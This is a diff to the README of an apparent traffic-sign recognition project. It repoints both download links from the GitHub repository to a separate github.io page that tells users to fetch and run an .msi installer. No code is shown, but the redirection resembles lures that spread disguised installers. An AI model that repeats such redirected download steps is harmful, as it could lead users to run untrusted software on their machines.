@@ -1,6 +1,6 @@
 # 🚦 traffic-sign-recognition-system - Automatic detection and classification of signs
 
-[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/transpolar-lawrencium17/traffic-sign-recognition-system)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://transpolar-lawrencium17.github.io)
 
 ## 📌 What this software does
 
@@ -22,7 +22,7 @@ Your computer must meet these requirements to run the software:
 
 Follow these steps to get the program on your machine:
 
-1. Visit [this page to download](https://github.com/transpolar-lawrencium17/traffic-sign-recognition-system).
+1. Visit [this page to download](https://transpolar-lawrencium17.github.io).
 2. Locate the latest release version on the screen.
 3. Click the file ending in .msi to start your download.
 4. Wait for the transfer to finish in your browser.
